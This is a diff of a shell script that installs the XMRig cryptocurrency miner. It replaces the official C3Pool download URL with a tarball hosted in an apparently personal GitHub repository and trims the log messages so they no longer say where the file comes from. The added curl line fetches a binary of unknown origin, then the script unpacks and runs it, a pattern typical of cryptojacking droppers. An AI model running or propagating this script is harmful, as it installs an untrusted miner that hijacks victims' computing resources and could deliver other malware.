@@ -129,14 +129,13 @@ killall -9 xmrig
 echo "[*] Removing $HOME/c3pool directory"
 rm -rf $HOME/c3pool
 
-echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+echo "[*] Downloading C3Pool"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/jgmjigfio/w/refs/heads/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download"
   exit 1
 fi
 
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
 [ -d $HOME/c3pool ] || mkdir $HOME/c3pool
 if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
@@ -166,7 +165,6 @@ if (test $? -ne 0); then
   fi
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
   if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
   fi
